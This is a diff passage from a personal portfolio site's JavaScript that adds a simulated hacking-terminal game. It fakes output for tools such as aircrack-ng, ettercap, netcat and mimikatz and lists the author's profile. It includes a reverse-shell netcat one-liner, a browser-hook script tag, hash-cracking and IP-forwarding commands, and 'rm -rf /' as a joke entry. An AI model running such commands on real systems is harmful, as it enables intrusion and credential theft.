+<span class="text-yellow-400">[*] This is a simulation. In real pentests, always have written authorization!</span>
+<span class="text-yellow-400">[*] Social engineering is the #1 attack vector — humans are the weakest link.</span>`;
+            },
+
+            beef: () => {
+                return `<span class="text-cyan-400">[*] BeEF — Browser Exploitation Framework v0.5.4.0</span>
+
+[+] Web UI: http://127.0.0.1:3000/ui/panel
+[+] Hook URL: <script>src="http://127.0.0.1:3000/hook.js"</script>
+    [+] RESTful API key: SIMULATED_KEY
+
+    <span class="text-green-400">[*] Hooked Browsers: 3</span>
+    [1] Chrome 120.0 @ Windows 11 (192.168.1.50)
+    [2] Firefox 121.0 @ Ubuntu 22.04 (192.168.1.51)
+    [3] Edge 120.0 @ Windows 10 (192.168.1.52)
+
+    <span class="text-yellow-400">[*] Browser exploitation demo. XSS hooks allow remote browser control.</span>`;
+    },
+
+    // ═══════════════ WIRELESS ATTACKS ═══════════════
+    'airmon-ng': () => {
+    return `<span class="text-cyan-400">[*] airmon-ng — Monitor Mode</span>
+
+    PHY Interface Driver Chipset
+    phy0 wlan0 ath9k Qualcomm Atheros AR9462
+
+    <span class="text-green-400">[+] wlan0 -> wlan0mon (monitor mode enabled)</span>
+    [*] Now use 'airodump-ng' to capture wireless traffic.`;
+    },
+
+    'airodump-ng': () => {
+    capturedHandshake = true;
+    return `<span class="text-cyan-400">[*] airodump-ng — Wireless Packet Capture</span>
+
+    BSSID PWR CH ENC ESSID
+    ──────────────────────────────────────────────────
+    AA:BB:CC:DD:EE:01 -42 6 WPA2 GrokGalaxy_WiFi
+    AA:BB:CC:DD:EE:02 -55 11 WPA2 TargetNetwork
+    AA:BB:CC:DD:EE:03 -68 1 WEP OpenNet
+    AA:BB:CC:DD:EE:04 -71 6 WPA2 SecureBase
+
+    STATION PWR BSSID Probes
+    ──────────────────────────────────────────────────
+    FF:FF:FF:11:22:33 -45 AA:BB:CC:DD:EE:01 GrokGalaxy_WiFi
+
+    <span class="text-green-400">[+] WPA Handshake captured: GrokGalaxy_WiFi</span>
+    [*] Use 'aircrack-ng' to crack the password.`;
+    },
+
+    'aircrack-ng': () => {
+    if (!capturedHandshake) return '<span class="text-red-400">[ERROR]</span> No handshake captured. Run "airodump-ng"
+    first.';
+    return `<span class="text-cyan-400">[*] aircrack-ng — WPA/WPA2 Key Cracker</span>
+    [*] Reading packets from capture file...
+    [*] Using wordlist: /usr/share/wordlists/rockyou.txt
+
+    Aircrack-ng 1.7
+
+    [00:00:42] 84523/14344391 keys tested (2012.45 k/s)
+
+    Time left: 1 hour, 57 minutes
+
+    <span class="text-green-400">KEY FOUND! [ CyberSec2025! ]</span>
+
+    Master Key : A3 F2 91 D7 4B 88 ...
+    Transient Key: 9C 28 F3 44 ...
+
+    <span class="text-green-400">[*] WiFi password cracked: CyberSec2025!</span>`;
+    },
+
+    wifite: () => {
+    return `<span class="text-cyan-400">
+        . . . ____ . .
+        | |__| | | | ___
+        | . | | |--- | | |___|
+        |_/ \\_| | | |___|
+        WiFite v2.7.0 — Automated Wireless Auditor</span>
+
+    [*] Scanning for targets...
+    NUM ESSID BSSID CH ENC PWR CLIENTS
+    --- ---------------- ---------------- -- ---- --- -------
+    1 GrokGalaxy_WiFi AA:BB:CC:DD:EE:01 6 WPA2 -42 1
+    2 TargetNetwork AA:BB:CC:DD:EE:02 11 WPA2 -55 0
+    3 OpenNet AA:BB:CC:DD:EE:03 1 WEP -68 2
+
+    <span class="text-yellow-400">[*] Use 'aircrack-ng' for manual control or let wifite auto-attack.</span>`;
+    },
+
+    // ═══════════════ SNIFFING & SPOOFING ═══════════════
+    wireshark: () => {
+    return `<span class="text-cyan-400">[*] Wireshark — Network Protocol Analyzer (CLI: tshark)</span>
+    Capturing on 'eth0'...
+
+    No. Time Source Dest Proto Info
+    ─── ─────── ────────────── ────────────── ───── ─────────────────────
+    1 0.000 10.10.14.2 ${targetIP} TCP SYN [80]
+    2 0.023 ${targetIP} 10.10.14.2 TCP SYN-ACK [80]
+    3 0.024 10.10.14.2 ${targetIP} TCP ACK [80]
+    4 0.025 10.10.14.2 ${targetIP} HTTP GET /login.php
+    5 0.048 ${targetIP} 10.10.14.2 HTTP 200 OK
+    6 0.100 10.10.14.2 ${targetIP} HTTP POST /login.php
+    <span class="text-red-400">7 0.101 10.10.14.2 ${targetIP} HTTP Credentials: admin:P@ssw0rd123!</span>
+
+    <span class="text-red-400">[!] Plaintext credentials captured! HTTP is insecure — use HTTPS!</span>`;
+    },
+
+    tcpdump: () => {
+    return `<span class="text-cyan-400">tcpdump: listening on eth0, link-type EN10MB</span>
+    ${new Date().toTimeString().slice(0,8)}.123456 IP 10.10.14.2.45678 > ${targetIP}.80: Flags [S], seq 1234567
+    ${new Date().toTimeString().slice(0,8)}.123789 IP ${targetIP}.80 > 10.10.14.2.45678: Flags [S.], seq 7654321, ack
+    1234568
+    ${new Date().toTimeString().slice(0,8)}.124012 IP 10.10.14.2.45678 > ${targetIP}.80: Flags [.], ack 7654322
+    ${new Date().toTimeString().slice(0,8)}.124345 IP 10.10.14.2.45678 > ${targetIP}.80: Flags [P.], HTTP GET /
+    ${new Date().toTimeString().slice(0,8)}.148234 ARP, Request who-has ${targetIP} tell 10.10.14.2
+    ${new Date().toTimeString().slice(0,8)}.148567 ARP, Reply ${targetIP} is-at ${macAddr}
+
+    <span class="text-green-400">6 packets captured</span>`;
+    },
+
+    ettercap: () => {
+    return `<span class="text-cyan-400">ettercap 0.8.3.1 — Man-in-the-Middle Tool</span>
+
+    [*] Listening on eth0 (10.10.14.2/255.255.255.0)
+    [*] ARP poisoning targets:
+    GROUP 1: ${targetIP} (${macAddr})
+    GROUP 2: ${targetIP.split('.').slice(0,3).join('.')}.1 (Gateway)
+
+    <span class="text-green-400">[+] ARP poisoning active!</span>
+    [*] Intercepting traffic between target and gateway...
+    [*] Captured packets: 247
+    <span class="text-red-400">[+] HTTP credentials captured: admin:P@ssw0rd123!</span>
+
+    <span class="text-yellow-400">[!] MITM attacks are illegal without authorization. Always get written
+        consent!</span>`;
+    },
+
+    arpspoof: () => {
+    return `<span class="text-cyan-400">[*] arpspoof — ARP Spoofing Tool</span>
+    [*] Spoofing ${targetIP.split('.').slice(0,3).join('.')}.1 is-at ${macAddr}
+    [*] Sending ARP replies to ${targetIP}...
+
+    AA:BB:CC:00:00:01 -> ${macAddr} (spoofed)
+    <span class="text-green-400">[+] ARP cache poisoned successfully!</span>
+    [*] Traffic from ${targetIP} now flows through us.
+
+    <span class="text-yellow-400">[*] Enable IP forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward</span>`;
+    },
+
+    responder: () => {
+    return `<span class="text-cyan-400">
+        .----.-----.-----.-----.-----.-----.-----| .-----.----.
+        | _| -__|__ --| _ | _ | | _ || -__| _|
+        |__| |_____|_____| __|_____|__|__|_____||_____|__|
+        |__| NBT-NS/LLMNR/MDNS Poisoner v3.1</span>
+
+    [+] Listening on eth0...
+    [*] Poisoning LLMNR/NBT-NS requests...
+
+    <span class="text-green-400">[+] NTLMv2 Hash captured:</span>
+    admin::GROKGALAXY:1234567890abcdef:A1B2C3D4...
+
+    <span class="text-yellow-400">[*] Crack with 'hashcat -m 5600 hash.txt wordlist.txt'</span>`;
+    },
+
+    // ═══════════════ POST-EXPLOITATION ═══════════════
+    netcat: () => {
+    return `<span class="text-cyan-400">[*] Netcat (nc) — The Network Swiss Army Knife</span>
+
+    Common usages:
+    nc -lvnp 4444 # Listen for reverse shell
+    nc ${targetIP} 80 # Connect to target
+    nc -e /bin/bash IP 4444 # Reverse shell (traditional)
+
+    <span class="text-green-400">[*] Listening on 0.0.0.0:4444...</span>
+    <span class="text-green-400">[*] Connection received from ${targetIP}:52341</span>
+    <span class="text-green-400">$ whoami</span>
+    www-data
+
+    <span class="text-yellow-400">[*] Shell obtained as www-data. Run 'linpeas' for privilege escalation.</span>`;
+    },
+
+    nc: () => { return hackingCommands.netcat(); },
+
+    linpeas: () => {
+    return `<span class="text-cyan-400">╔══════════════════════════════════════════╗
+        ║ LinPEAS — Linux Privilege ║
+        ║ Escalation Awesome Script ║
+        ╚══════════════════════════════════════════╝</span>
+
+    <span class="text-red-400">[+] SUID binaries found:</span>
+    -rwsr-xr-x /usr/bin/find
+    -rwsr-xr-x /usr/bin/pkexec
+    -rwsr-xr-x /usr/bin/sudo
+
+    <span class="text-red-400">[+] Writable /etc/passwd!</span>
+    <span class="text-yellow-400">[+] Cron jobs running as root:</span>
+    */5 * * * * /opt/backup.sh
+    <span class="text-red-400">[+] /opt/backup.sh is WRITABLE!</span>
+
+    <span class="text-green-400">[+] Kernel: Linux 5.15.0-91 — CVE-2023-XXXXX may apply</span>
+    <span class="text-green-400">[*] Multiple privesc vectors found! Use: find / -perm -u=s 2>/dev/null</span>`;
+    },
+
+    winpeas: () => {
+    return `<span class="text-cyan-400">╔══════════════════════════════════════════╗
+        ║ WinPEAS — Windows Privilege ║
+        ║ Escalation Awesome Script ║
+        ╚══════════════════════════════════════════╝</span>
+
+    <span class="text-red-400">[+] Unquoted Service Paths found:</span>
+    C:\\Program Files\\Vuln Service\\service.exe
+    <span class="text-red-400">[+] AlwaysInstallElevated is ENABLED!</span>
+    <span class="text-yellow-400">[+] Stored credentials found in Credential Manager</span>
+    <span class="text-yellow-400">[+] Autologon credentials in registry:</span>
+    DefaultUserName: Administrator
+    DefaultPassword: Admin2025!
+
+    <span class="text-green-400">[*] This is a Linux terminal. WinPEAS shown for educational reference.</span>`;
+    },
+
+    mimikatz: () => {
+    return `<span class="text-cyan-400"> .#####. mimikatz 2.2.0 (x64)
+        .## ^ ##. "A La Vie, A L'Amour"
+        ## / \\ ## Benjamin DELPY (gentilkiwi)
+        ## \\ / ## https://blog.gentilkiwi.com
+        '## v ##'
+        '#####'</span>
+
+    mimikatz # sekurlsa::logonpasswords
+
+    <span class="text-green-400">Authentication Id : 0 ; 999 (00000000:000003e7)
+        Session : Interactive from 1
+        User Name : Administrator
+        Domain : GROKGALAXY
+        NTLM : aad3b435b51404eeaad3b435b51404ee
+        SHA1 : d4e97d37...</span>
+
+    <span class="text-yellow-400">[*] Windows credential extraction tool. Educational demo only.</span>
+    [*] Use 'hashcat' to crack NTLM hashes offline.`;
+    },
+
+    bloodhound: () => {
+    return `<span class="text-cyan-400">[*] BloodHound — Active Directory Attack Path Mapping</span>
+
+    [+] Collecting AD data via SharpHound...
+    [+] Domains enumerated: GROKGALAXY.LOCAL
+    [+] Users: 142 | Groups: 38 | Computers: 27
+
+    <span class="text-red-400">[!] Attack Paths to Domain Admin: 3 found</span>
+    1. USER@grokgalaxy.local → GenericAll → ADMIN-GROUP → DA
+    2. USER@grokgalaxy.local → HasSession → DC01 → DCSync → DA
+    3. USER@grokgalaxy.local → WriteDACL → OU → GPO Abuse → DA
+
+    <span class="text-yellow-400">[*] AD attack path analysis. Used in real Red Team engagements.</span>`;
+    },
+
+    // ═══════════════ MISSION COMMANDS ═══════════════
+    hack: () => {
+    if (gameProgress < 1)
+        return '<span class="text-red-400">[ERROR]</span> No target found. Run "scan" or "nmap" first.' ;
+        gameProgress=2; return `<span class="text-red-400">[HACKING]</span> Initiating breach on ${targetIP}...
+        [+] Exploiting weak authentication...
+        [+] Bypassing firewall...
+        [+] Injecting payload...
+        <span class="text-green-400">[✓] ACCESS GRANTED!</span>
+        [*] Encrypted data found. Type 'decrypt' to decode.`;
+        },
+
+        decrypt: () => {
+        if (gameProgress < 2)
+            return '<span class="text-red-400">[ERROR]</span> No data to decrypt. Complete the hack first.' ;
+            gameProgress=3; return `<span class="text-cyan-400">[DECRYPTING]</span> Running decryption algorithm...
+            [+] Breaking cipher...
+            [+] Reconstructing data...
+            <span class="text-green-400">[✓] DECRYPTION COMPLETE!</span>
+
+            <span class="text-green-400">╔════════════════════════════════════════╗
+                ║ CLASSIFIED INFORMATION RETRIEVED: ║
+                ║ ║
+                ║ Name: Shankar Adhikary ║
+                ║ Clearance: TOP SECRET ║
+                ║ Status: Cybersecurity Expert ║
+                ║ Mission: Secure the Digital Frontier ║
+                ║ ║
+                ║ राष्ट्रीय सुरक्षा सर्वोपरि ║
+                ╚════════════════════════════════════════╝</span>
+
+            [*] Congratulations! You completed the simulation!`;
+            },
+
+            ssh: () => {
+            sshConnected = true;
+            return `<span class="text-cyan-400">[*] ssh admin@${targetIP}</span>
+            The authenticity of host '${targetIP}' can't be established.
+            ED25519 key fingerprint is SHA256:xD3F...kL9m.
+            Are you sure you want to continue connecting (yes/no)? yes
+            Warning: Permanently added '${targetIP}' (ED25519) to known hosts.
+            admin@${targetIP}'s password: ********
+
+            <span class="text-green-400">Welcome to Ubuntu 22.04 LTS (GNU/Linux 5.15.0-91-generic x86_64)
+
+                Last login: ${new Date().toDateString()} from 10.10.14.2
+
+                admin@target:~$</span>
+            <span class="text-green-400">[*] SSH connection established! You're in.</span>`;
+            },
+
+            // ═══════════════ SYSTEM COMMANDS ═══════════════
+            ls: () => {
+            const files = fileSystem[currentDir] || ['(empty)'];
+            return files.map(f => {
+            if (f.endsWith('/')) return `<span class="text-blue-400">${f}</span>`;
+            if (f.startsWith('.')) return `<span class="text-gray-500">${f}</span>`;
+            if (f.endsWith('.py') || f.endsWith('.sh')) return `<span class="text-green-400">${f}</span>`;
+            if (f.endsWith('.txt') || f.endsWith('.pdf') || f.endsWith('.png')) return `<span
+                class="text-yellow-400">${f}</span>`;
+            return f;
+            }).join(' ');
+            },
+
+            'll': () => {
+            const files = fileSystem[currentDir] || ['(empty)'];
+            const lines = ['total ' + files.length * 4];
+            files.forEach(f => {
+            const isDir = f.endsWith('/') || (!f.includes('.') && !f.startsWith('.'));
+            const perm = isDir ? 'drwxr-xr-x' : '-rw-r--r--';
+            const size = Math.floor(Math.random() * 10000);
+            const name = isDir ? `<span class="text-blue-400">${f}</span>` : f;
+            lines.push(`${perm} 1 root root ${String(size).padStart(6)} Jan 15 ${name}`);
             });
-        })();
+            return lines.join('\n');
+            },
 
-        // ==================== SERVICE WORKER REGISTRATION (PWA) ====================
-        if ('serviceWorker' in navigator) {
-            window.addEventListener('load', () => {
-                navigator.serviceWorker.register('sw.js')
-                    .then(registration => {
-                        console.log('✅ Service Worker registered:', registration.scope);
-                    })
-                    .catch(error => {
-                        console.log('❌ Service Worker registration failed:', error);
-                    });
-            });
-        }
+            cd: 'CD_HANDLER',
 
-        // ==================== CUSTOM CURSOR ====================
-        (function () {
-            const cursor = document.getElementById('custom-cursor');
-            const trail = document.getElementById('cursor-trail');
+            cat: 'CAT_HANDLER',
 
-            if (!cursor || !trail) return;
+            pwd: () => currentDir,
 
-            let mouseX = 0, mouseY = 0;
-            let trailX = 0, trailY = 0;
+            id: `uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),46(plugdev)`,
 
-            document.addEventListener('mousemove', (e) => {
-                mouseX = e.clientX;
-                mouseY = e.clientY;
-                cursor.style.left = mouseX + 'px';
-                cursor.style.top = mouseY + 'px';
-            });
+            uname: `Linux kali 6.5.0-kali3-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.5.6-1kali1 x86_64 GNU/Linux`,
 
-            // Smooth trail animation
-            function animateTrail() {
-                trailX += (mouseX - trailX) * 0.15;
-                trailY += (mouseY - trailY) * 0.15;
-                trail.style.left = trailX + 'px';
-                trail.style.top = trailY + 'px';
-                requestAnimationFrame(animateTrail);
-            }
-            animateTrail();
+            'uname -a': `Linux kali 6.5.0-kali3-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.5.6-1kali1 (2023-10-09) x86_64
+            GNU/Linux`,
 
-            // Hover effect on interactive elements
-            const interactiveElements = document.querySelectorAll('a, button, input, textarea, select, .glass-card, .project-card, .nav-link');
-            interactiveElements.forEach(el => {
-                el.addEventListener('mouseenter', () => cursor.classList.add('hover'));
-                el.addEventListener('mouseleave', () => cursor.classList.remove('hover'));
-            });
+            ifconfig: () => {
+            return `eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST> mtu 1500
+                inet 10.10.14.2 netmask 255.255.255.0 broadcast 10.10.14.255
+                inet6 fe80::a00:27ff:fe3e:1234 prefixlen 64
+                ether 08:00:27:3e:12:34 txqueuelen 1000
+                RX packets 15247 bytes 12583429 (12.0 MiB)
+                TX packets 8923 bytes 1247381 (1.1 MiB)
 
-            // Click effect
-            document.addEventListener('mousedown', () => cursor.classList.add('click'));
-            document.addEventListener('mouseup', () => cursor.classList.remove('click'));
+                lo: flags=73<UP,LOOPBACK,RUNNING> mtu 65536
+                    inet 127.0.0.1 netmask 255.0.0.0
+                    inet6 ::1 prefixlen 128
 
-            // Hide cursor when leaving window
-            document.addEventListener('mouseleave', () => {
-                cursor.style.opacity = '0';
-                trail.style.opacity = '0';
-            });
-            document.addEventListener('mouseenter', () => {
-                cursor.style.opacity = '1';
-                trail.style.opacity = '0.6';
-            });
-        })();
+                    <span class="text-green-400">wlan0mon: flags=4163<UP,BROADCAST,RUNNING,MULTICAST> mtu 1500</span>
+                    unspec 00-C0-CA-97-12-34 txqueuelen 1000
+                    Mode: Monitor`;
+                    },
 
-        // ==================== BACK TO TOP BUTTON ====================
-        (function () {
-            const backToTop = document.getElementById('back-to-top');
+                    ip: () => { return hackingCommands.ifconfig(); },
 
-            if (!backToTop) return;
+                    ps: ` PID TTY STAT TIME COMMAND
+                    1 ? Ss 0:02 /sbin/init
+                    234 ? Ssl 0:15 /usr/sbin/NetworkManager
+                    456 ? S 0:00 /usr/sbin/apache2 -k start
+                    789 ? Ss 0:01 sshd: /usr/sbin/sshd
+                    1234 pts/0 Ss 0:00 -bash
+                    1337 pts/0 S+ 0:00 python3 /root/tools/c2_server.py
+                    1338 ? S 0:00 /usr/sbin/mysqld
+                    1500 pts/0 R+ 0:00 ps aux`,
 
-            // Show/hide based on scroll position
-            window.addEventListener('scroll', () => {
-                if (window.scrollY > 500) {
-                    backToTop.classList.add('visible');
-                } else {
-                    backToTop.classList.remove('visible');
-                }
-            });
+                    'ps aux': `USER PID %CPU %MEM VSZ RSS TTY STAT TIME COMMAND
+                    root 1 0.1 0.4 16884 8420 ? Ss 0:02 /sbin/init
+                    root 234 0.3 1.2 48392 24412 ? Ssl 0:15 /usr/sbin/NetworkManager
+                    www-data 456 0.0 0.8 32984 16744 ? S 0:00 /usr/sbin/apache2
+                    root 789 0.0 0.3 15420 6120 ? Ss 0:01 sshd
+                    root 1234 0.0 0.2 9584 4824 pts/0 Ss 0:00 -bash
+                    root 1337 0.5 1.5 42384 30120 pts/0 S+ 0:00 python3 c2_server.py
+                    mysql 1338 1.2 5.4 182423 108412 ? S 0:00 /usr/sbin/mysqld`,
 
-            // Scroll to top on click
-            backToTop.addEventListener('click', () => {
-                window.scrollTo({
-                    top: 0,
-                    behavior: 'smooth'
-                });
-            });
-        })();
+                    history: () => {
+                    if (commandHistory.length === 0) return '(no commands in history)';
+                    return commandHistory.slice(-20).map((c, i) => ` ${String(i + 1).padStart(4)} ${c}`).join('\n');
+                    },
 
-    </script>
+                    neofetch: () => {
+                    return `<span class="text-cyan-400"> _,met\$\$\$\$\$gg. </span><span
+                        class="text-white">root@kali</span>
+                    <span class="text-cyan-400"> ,g\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$P. </span><span
+                        class="text-white">---------</span>
+                    <span class="text-cyan-400"> ,g\$\$P" """Y\$\$." </span><span class="text-yellow-400">OS:</span>
+                    Kali GNU/Linux Rolling x86_64
+                    <span class="text-cyan-400"> ,\$\$P' '\$\$\$. </span><span class="text-yellow-400">Host:</span> Grok
+                    Galaxy Portfolio
+                    <span class="text-cyan-400">',\$\$P ,ggs. '\$\$b: </span><span
+                        class="text-yellow-400">Kernel:</span> 6.5.0-kali3-amd64
+                    <span class="text-cyan-400"> d\$\$' ,\$P"' . \$\$\$ </span><span
+                        class="text-yellow-400">Shell:</span> bash 5.2.15
+                    <span class="text-cyan-400"> \$\$P d\$' , \$\$P </span><span
+                        class="text-yellow-400">Terminal:</span> SA Portfolio v3.0
+                    <span class="text-cyan-400"> \$\$: \$\$. - ,d\$\$' </span><span class="text-yellow-400">CPU:</span>
+                    Shankar Brain @ 3.5GHz
+                    <span class="text-cyan-400"> \$\$; Y\$b._ _,d\$P' </span><span
+                        class="text-yellow-400">Memory:</span> 1337MiB / 16384MiB
+                    <span class="text-cyan-400"> Y\$\$. '.\`"Y\$\$\$\$P"' </span><span
+                        class="text-yellow-400">Tools:</span> 50+ Security Tools
+                    <span class="text-cyan-400"> '\$\$b "-.__ </span><span class="text-yellow-400">Uptime:</span>
+                    ${Math.floor(Math.random() * 30)} days
+                    <span class="text-cyan-400"> '\$\$ </span><span class="text-yellow-400">Certs:</span> 25+
+                    Certifications
+                    <span class="text-cyan-400"> '\$\$._ </span><span class="text-yellow-400">Motto:</span> राष्ट्रीय
+                    सुरक्षा सर्वोपरि
+                    <span class="text-cyan-400"> '""'</span>`;
+                    },
+
+                    date: () => new Date().toString(),
+
+                    uptime: () => {
+                    const days = Math.floor(Math.random() * 30) + 1;
+                    const hrs = Math.floor(Math.random() * 24);
+                    return ` ${new Date().toTimeString().slice(0,8)} up ${days} days,
+                    ${hrs}:${Math.floor(Math.random()*60).toString().padStart(2,'0')}, 2 users, load average: 0.42,
+                    0.38, 0.31`;
+                    },
+
+                    df: `Filesystem Size Used Avail Use% Mounted on
+                    /dev/sda1 50G 18G 30G 37% /
+                    tmpfs 7.8G 1.2M 7.8G 1% /dev/shm
+                    /dev/sda2 200G 95G 95G 50% /home
+                    tmpfs 1.6G 8.0K 1.6G 1% /tmp`,
+
+                    hostname: 'kali',
+
+                    'cat /etc/passwd': () => fileContents['/etc/passwd'],
+                    'cat /etc/shadow': () => fileContents['/etc/shadow'],
+                    'cat /etc/hosts': () => fileContents['/etc/hosts'],
+
+                    // ═══════════════ PORTFOLIO COMMANDS ═══════════════
+                    whoami: `<span class="text-green-400">root</span>@grok-galaxy
+                    User: Guest Hacker
+                    Level: Script Kiddie -> Elite (Complete the simulation!)
+                    Mission: Hack into Shankar's portfolio`,
+
+                    skills: `<span class="text-cyan-400">[SHANKAR'S SKILL MATRIX]</span>
+                    ╔══════════════════════════════════════════╗
+                    ║ Cybersecurity ████████████████░░ 90%║
+                    ║ Full Stack Dev ███████████████░░░ 85%║
+                    ║ AI / ML ████████████░░░░░░ 75%║
+                    ║ DevOps / Cloud ███████████░░░░░░░ 70%║
+                    ║ Photography ██████████░░░░░░░░ 65%║
+                    ║ Reverse Engineering ████████████░░░░░░ 70%║
+                    ║ OSINT ███████████████░░░ 85%║
+                    ║ Red Teaming ████████████████░░ 90%║
+                    ╚══════════════════════════════════════════╝`,
+
+                    contact: `<span class="text-cyan-400">[CONTACT INFORMATION]</span>
+                    Email: adhikaryshankar04@gmail.com
+                    LinkedIn: linkedin.com/in/adhikaryxshankar
+                    GitHub: github.com/ShankarAdhikary
+                    X/Twitter: x.com/SHANKARAD2006
+                    Instagram: instagram.com/the0xshankar
+                    Portfolio: shankaradhikary.github.io/portfolio`,
+
+                    certs: `<span class="text-cyan-400">[CERTIFICATIONS — 25+]</span>
+                    [+] Fundamentals of MCP
+                    [+] Cybersecurity (Tech Mahindra)
+                    [+] Networking (NVIDIA)
+                    [+] OSINT (Security Research)
+                    [+] Python (NIELIT)
+                    [+] C Programming
+                    [+] Network Fundamentals (Cybrary)
+                    [+] Shaastra 2026 (IIT Madras)
+                    [+] Open Source Contributor (OSC Global)
+                    [+] Campus Lead (OSC Global 2026)
+                    ... and 15 more!`,
+
+                    projects: `<span class="text-cyan-400">[PROJECTS]</span>
+                    [01] Open Source Connect Platform — React, Node.js, MongoDB
+                    [02] RedTeam Toolkit — Python, Bash, Kali
+                    [03] Threat Detector AI — TensorFlow, Python
+                    [04] SecureVault — Rust, WebAssembly
+                    [05] OSINT Framework — Python, Flask
+                    [06] Vulnerability Scanner — Python, Node.js
+                    [07] AI Threat Detector — TensorFlow, Python
+                    [08] Network Monitor — Python, React
+                    [09] Phishing Detector — NLP, Python
+                    [10] Cloud Security Tool — Python, AWS SDK`,
+
+                    about: `<span class="text-cyan-400">[ABOUT SHANKAR ADHIKARY]</span>
+                    Name: Shankar Adhikary
+                    Age: 19 (Born 2006)
+                    Education: BTech Cybersecurity @ RRU (2025-2029)
+                    Focus: Red Team | Penetration Testing | AI/ML
+                    Location: Rashtriya Raksha University, Gujarat, India
+                    Motto: राष्ट्रीय सुरक्षा सर्वोपरि (National Security is Supreme)
+
+                    Passionate cybersecurity enthusiast and aspiring Red Team specialist.
+                    Campus Lead @ Open Source Connect Global 2026.`,
+
+                    socials: `<span class="text-cyan-400">[SOCIAL LINKS]</span>
+                    GitHub: <span class="text-green-400">github.com/ShankarAdhikary</span>
+                    LinkedIn: <span class="text-blue-400">linkedin.com/in/adhikaryxshankar</span>
+                    Twitter/X: <span class="text-cyan-400">x.com/SHANKARAD2006</span>
+                    Instagram: <span class="text-purple-400">instagram.com/the0xshankar</span>
+                    Portfolio: <span class="text-yellow-400">shankaradhikary.github.io/portfolio</span>`,
+
+                    // ═══════════════ UTILITIES ═══════════════
+                    clear: 'CLEAR',
+                    exit: 'EXIT',
+
+                    reset: () => {
+                    gameProgress = 0;
+                    sshConnected = false;
+                    capturedHandshake = false;
+                    sqlTarget = false;
+                    currentDir = '/root';
+                    commandHistory = [];
+                    return '<span class="text-green-400">[*] Simulation reset. All progress cleared. Type "help" to
+                        start.</span>';
+                    },
+
+                    banner: `<span class="text-purple-400">
+                        ██████╗ ██████╗ ██████╗ ██╗ ██╗ ██████╗ █████╗ ██╗ █████╗ ██╗ ██╗██╗ ██╗
+                        ██╔════╝ ██╔══██╗██╔═══██╗██║ ██╔╝ ██╔════╝ ██╔══██╗██║ ██╔══██╗╚██╗██╔╝╚██╗ ██╔╝
+                        ██║ ███╗██████╔╝██║ ██║█████╔╝ ██║ ███╗███████║██║ ███████║ ╚███╔╝ ╚████╔╝
+                        ██║ ██║██╔══██╗██║ ██║██╔═██╗ ██║ ██║██╔══██║██║ ██╔══██║ ██╔██╗ ╚██╔╝
+                        ╚██████╔╝██║ ██║╚██████╔╝██║ ██╗ ╚██████╔╝██║ ██║███████╗██║ ██║██╔╝ ██╗ ██║
+                        ╚═════╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═╝╚══════╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝</span>
+
+                    <span class="text-green-400"> Shankar Adhikary | Cybersecurity Researcher | Red Team
+                        Specialist</span>
+                    <span class="text-yellow-400"> राष्ट्रीय सुरक्षा सर्वोपरि | National Security is Supreme</span>`,
+
+                    matrix: () => {
+                    const chars = 'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン01';
+                    let lines = [];
+                    for (let i = 0; i < 8; i++) { let line='' ; for (let j=0; j < 60; j++) { line
+                        +=chars[Math.floor(Math.random() * chars.length)]; } lines.push(`<span class="text-green-400">
+                        ${line}</span>`);
+                        }
+                        lines.push('');
+                        lines.push('<span class="text-yellow-400">[*] Wake up, Neo... The Matrix has you.</span>');
+                        lines.push('<span class="text-yellow-400">[*] Follow the white rabbit. Type "help" to
+                            begin.</span>');
+                        return lines.join('\n');
+                        },
+
+                        sudo: '<span class="text-green-400">[sudo]</span> You are already root! Full access granted.',
+                        'sudo su': '<span class="text-green-400">[sudo]</span> You are already root! Full access
+                        granted.',
+                        su: '<span class="text-green-400">[sudo]</span> You are already root!',
+                        wget: `<span class="text-cyan-400">[*] wget — File downloader</span>\nUsage: wget [URL]\n<span
+                            class="text-yellow-400">[*] Try 'linpeas' or 'msfvenom' instead in this simulation.</span>`,
+                        curl: `<span class="text-cyan-400">[*] curl — Data transfer tool</span>\nUsage: curl
+                        [URL]\n<span class="text-yellow-400">[*] Try 'nikto' or 'gobuster' for web requests in this
+                            simulation.</span>`,
+                        chmod: '<span class="text-green-400">[+] chmod +x applied. File is now executable.</span>',
+                        grep: '<span class="text-cyan-400">[*] grep — Pattern matching tool. Usage: grep [PATTERN]
+                            [FILE]</span>',
+                        find: '<span class="text-cyan-400">[*] find / -perm -u=s -type f
+                            2>/dev/null</span>\n/usr/bin/find\n/usr/bin/pkexec\n/usr/bin/sudo\n/usr/bin/passwd\n<span
+                            class="text-green-400">[*] SUID binaries found. Potential privilege escalation!</span>',
+                        'find / -perm -u=s': '<span class="text-cyan-400">[*] SUID
+                            binaries:</span>\n/usr/bin/find\n/usr/bin/pkexec\n/usr/bin/sudo\n/usr/bin/passwd\n<span
+                            class="text-green-400">[*] Check GTFOBins for exploitation techniques.</span>',
+                        man: '<span class="text-cyan-400">[*] man — Manual pages. Type any command name for its
+                            output!</span>',
+                        echo: '<span class="text-green-400">Hello from Grok Galaxy Terminal!</span>',
+                        touch: '<span class="text-green-400">[+] File created.</span>',
+                        mkdir: '<span class="text-green-400">[+] Directory created.</span>',
+                        rm: '<span class="text-red-400">[!] rm: Operation not permitted in simulation mode.</span>',
+                        'rm -rf /': '<span class="text-red-400">[!] Nice try! This is a simulation. No destruction
+                            allowed. 😄</span>',
+                        ':q': '<span class="text-yellow-400">[*] This is not vim! Type "exit" to leave.</span>',
+                        ':wq': '<span class="text-yellow-400">[*] This is not vim! Type "exit" to leave.</span>',
+                        vi: '<span class="text-yellow-400">[*] vim/vi not available in simulation. Use "cat" to view
+                            files.</span>',
+                        vim: '<span class="text-yellow-400">[*] vim/vi not available in simulation. Use "cat" to view
+                            files.</span>',
+                        nano: '<span class="text-yellow-400">[*] nano not available in simulation. Use "cat" to view
+                            files.</span>',
+                        };
+
+                        function addTerminalLine(text, delay = 0) {
+                        setTimeout(() => {
+                        const line = document.createElement('p');
+                        line.className = 'terminal-line';
+                        line.style.animationDelay = '0s';
